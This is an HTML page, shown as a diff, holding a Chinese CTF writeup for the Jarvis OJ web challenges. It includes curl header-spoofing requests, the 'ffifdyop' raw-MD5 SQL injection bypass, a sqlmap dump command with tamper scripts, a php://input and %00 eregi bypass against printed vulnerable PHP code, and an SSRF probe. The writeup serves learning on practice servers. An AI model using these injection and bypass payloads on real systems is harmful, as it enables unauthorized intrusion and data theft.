@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="PORT51使用curl的—local-port参数就行，但是不知道为什么我的mac和虚拟机都不行，估计是学校网最后有个nat所以端口会变，换了服务器就好了。还要注意使用1024编号以下的端口需要root权限 1234567891011121314151617root@(none):~# curl --local-port 51  http://web.jarvisoj.com:32770&amp;lt;">
+<meta name="keywords" content="jarvisOJ,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvis OJ writeup (Web部分)">
+<meta property="og:url" content="https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/index.html">
+<meta property="og:site_name" content="Lkerenl&#39;Blog 你的本质">
+<meta property="og:description" content="PORT51使用curl的—local-port参数就行，但是不知道为什么我的mac和虚拟机都不行，估计是学校网最后有个nat所以端口会变，换了服务器就好了。还要注意使用1024编号以下的端口需要root权限 1234567891011121314151617root@(none):~# curl --local-port 51  http://web.jarvisoj.com:32770&amp;lt;">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://lkerenl.github.io/images/jarvis-OJ-Web/56F4FDA0-671A-418F-84E0-07AEAC6BB7D8.png">
+<meta property="og:image" content="https://lkerenl.github.io/images/jarvis-OJ-Web/E1184B2F-FB95-4030-BFB1-908A856D259B.png">
+<meta property="og:image" content="https://lkerenl.github.io/images/jarvis-OJ-Web/3FED12B1-0C17-44A8-8C60-1B3FD866CE96.png">
+<meta property="og:image" content="https://lkerenl.github.io/images/jarvis-OJ-Web/1BC533F1-6DA9-4E0C-BD2B-08254E70CFC6.png">
+<meta property="og:image" content="https://lkerenl.github.io/images/jarvis-OJ-Web/A5F768E9-7FA4-4F8F-84FA-03B2FD2F0396.png">
+<meta property="og:image" content="https://lkerenl.github.io/images/jarvis-OJ-Web/5EDA8678-822A-4778-B7D7-AA4B272512FE.png">
+<meta property="og:image" content="https://lkerenl.github.io/images/jarvis-OJ-Web/771FAB6A-0E9D-4E74-B164-64E1A033CB30.png">
+<meta property="og:updated_time" content="2019-07-09T09:27:18.848Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="jarvis OJ writeup (Web部分)">
+<meta name="twitter:description" content="PORT51使用curl的—local-port参数就行，但是不知道为什么我的mac和虚拟机都不行，估计是学校网最后有个nat所以端口会变，换了服务器就好了。还要注意使用1024编号以下的端口需要root权限 1234567891011121314151617root@(none):~# curl --local-port 51  http://web.jarvisoj.com:32770&amp;lt;">
+<meta name="twitter:image" content="https://lkerenl.github.io/images/jarvis-OJ-Web/56F4FDA0-671A-418F-84E0-07AEAC6BB7D8.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>jarvis OJ writeup (Web部分)</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/07/09/jarvis-OJ-writeup-Misc部分/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&text=jarvis OJ writeup (Web部分)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&is_video=false&description=jarvis OJ writeup (Web部分)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=jarvis OJ writeup (Web部分)&body=Check out this article: https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&name=jarvis OJ writeup (Web部分)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PORT51"><span class="toc-number">1.</span> <span class="toc-text">PORT51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOCALHOST"><span class="toc-number">2.</span> <span class="toc-text">LOCALHOST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOGIN"><span class="toc-number">3.</span> <span class="toc-text">LOGIN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#神盾局的秘密"><span class="toc-number">4.</span> <span class="toc-text">神盾局的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-Injection"><span class="toc-number">5.</span> <span class="toc-text">Simple Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IN-A-Mess"><span class="toc-number">6.</span> <span class="toc-text">IN A Mess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#api"><span class="toc-number">7.</span> <span class="toc-text">api</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        jarvis OJ writeup (Web部分)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Lkerenl'Blog 你的本质</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-09T08:27:03.000Z" itemprop="datePublished">2019-07-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF-writeup/">CTF writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Web/">Web</a>, <a class="tag-link" href="/tags/jarvisOJ/">jarvisOJ</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>使用curl的—local-port参数就行，但是不知道为什么我的mac和虚拟机都不行，估计是学校网最后有个nat所以端口会变，换了服务器就好了。还要注意使用1024编号以下的端口需要root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@(none):~<span class="comment"># curl --local-port 51  http://web.jarvisoj.com:32770</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 100&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background:gray;</span><br><span class="line">		text-align:center;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h3&gt;Yeah!! Here<span class="string">'s your flag:PCTF&#123;M45t3r_oF_CuRl&#125;&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>加个XFF头就行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl web.jarvisoj.com:32774 -H<span class="string">"X-ForWarded-For: 127.0.0.1"</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 150&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background:gray;</span><br><span class="line">		text-align:center;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h3&gt;Yeah!! Here<span class="string">'s your flag:PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;&lt;/h3&gt;	</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="LOGIN"><a href="#LOGIN" class="headerlink" title="LOGIN"></a>LOGIN</h2><p>response里发现hint</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: "<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+
+<p>php官方对md5函数是这么描述的</p>
+<blockquote>
+<p>md5 ( string $str [, bool $raw_output = FALSE ] ) : string`<br>Calculates the MD5 hash of str using the » RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash.</p>
+<p>str<br>The string.<br>raw_output<br>If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16.</p>
+</blockquote>
+<p>它用的是字符串的拼接,没有任何过滤，那么只要构造字符串的md5转成字符串是<code>’ or ‘xxx</code>xxx的值为<code>true</code>就行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl -X POST -d <span class="string">"pass=ffifdyop"</span> http://web.jarvisoj.com:32772/ </span><br><span class="line">Correct pass!! Your Flag: PCTF&#123;R4w_md5_is_d4ng3rous&#125;</span><br><span class="line">&lt;form action=<span class="string">"/"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">  password: &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"pass"</span> /&gt;</span><br><span class="line">  &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>抓包发现请求了一个showimg.php<br><img src="/images/jarvis-OJ-Web/56F4FDA0-671A-418F-84E0-07AEAC6BB7D8.png" alt="神盾局的秘密"><br>base64解一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ echo &quot;c2hpZWxkLmpwZw==&quot;|base64 -d -</span><br><span class="line">shield.jpg%</span><br></pre></td></tr></table></figure>
+
+<p>直接换个index.php上去看看</p>
+<h2 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h2><p>打开发现是个登陆界面，随便试了试admin,123456提示密码错误</p>
+<p><img src="/images/jarvis-OJ-Web/E1184B2F-FB95-4030-BFB1-908A856D259B.png" alt="Simple Injection"><br>又试了试admin ‘ or 1 = 1 # ，123456 发现提示用户名错误</p>
+<p><img src="/images/jarvis-OJ-Web/3FED12B1-0C17-44A8-8C60-1B3FD866CE96.png" alt="Simple Injection"><br>那么通过这两字符串就能判断是否注入成功，判读注入的标志有了，现在该测试过滤了、最后发现过滤了and or之类的<br>使用sqlmap的space2comment symboliclogical这两temper绕过一下就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap --data=&quot;username=admin&amp;password=kslda&quot; -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --batch --dbms=mysql --level 3 -v 3 --string &quot;密码错误&quot; --tamper &quot;space2comment,symboliclogical&quot; --dbms=mysql -T admin -C password --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/jarvis-OJ-Web/1BC533F1-6DA9-4E0C-BD2B-08254E70CFC6.png" alt="Simple Injection"></p>
+<p><img src="/images/jarvis-OJ-Web/A5F768E9-7FA4-4F8F-84FA-03B2FD2F0396.png" alt="Simple Injection"></p>
+<p><img src="/images/jarvis-OJ-Web/5EDA8678-822A-4778-B7D7-AA4B272512FE.png" alt="Simple Injeciton"><br>flag:CTF{s1mpl3_1nJ3ction_very_easy!!}</p>
+<h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>查看源代码发现 index.phps文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要过几个check</p>
+<ul>
+<li>使用字符串绕过id的check</li>
+<li>使用php伪协议(php://input data:// 等)绕过a的check</li>
+<li>使用eregi的%00截断特性绕过b的check<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl -X POST -d &apos;1112 is a nice lab!&apos;  &apos;web.jarvisoj.com:32780/index.php?id=asdas&amp;a=php://input&amp;b=%0011111111233&apos;</span><br><span class="line">&lt;!--index.phps--&gt;Come ON!!! &#123;/^HT2mCpcvOLf&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>访问<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</code>发现是个注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl &quot;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1&quot;</span><br><span class="line">hi666</span><br><span class="line">➜  ~ curl &quot;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1&apos;&quot;</span><br><span class="line">SELECT * FROM content WHERE id=1&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="api"><a href="#api" class="headerlink" title="api"></a>api</h2><p>右键查看源代码发现</p>
+<p><img src="/images/jarvis-OJ-Web/771FAB6A-0E9D-4E74-B164-64E1A033CB30.png" alt="api"><br>直接访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32782/proxy.php?url=www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>弹出百度页面</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PORT51"><span class="toc-number">1.</span> <span class="toc-text">PORT51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOCALHOST"><span class="toc-number">2.</span> <span class="toc-text">LOCALHOST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOGIN"><span class="toc-number">3.</span> <span class="toc-text">LOGIN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#神盾局的秘密"><span class="toc-number">4.</span> <span class="toc-text">神盾局的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-Injection"><span class="toc-number">5.</span> <span class="toc-text">Simple Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IN-A-Mess"><span class="toc-number">6.</span> <span class="toc-text">IN A Mess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#api"><span class="toc-number">7.</span> <span class="toc-text">api</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&text=jarvis OJ writeup (Web部分)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&is_video=false&description=jarvis OJ writeup (Web部分)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=jarvis OJ writeup (Web部分)&body=Check out this article: https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&title=jarvis OJ writeup (Web部分)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://lkerenl.github.io/2019/07/09/jarvis-OJ-writeup-Web部分/&name=jarvis OJ writeup (Web部分)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Lkerenl
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
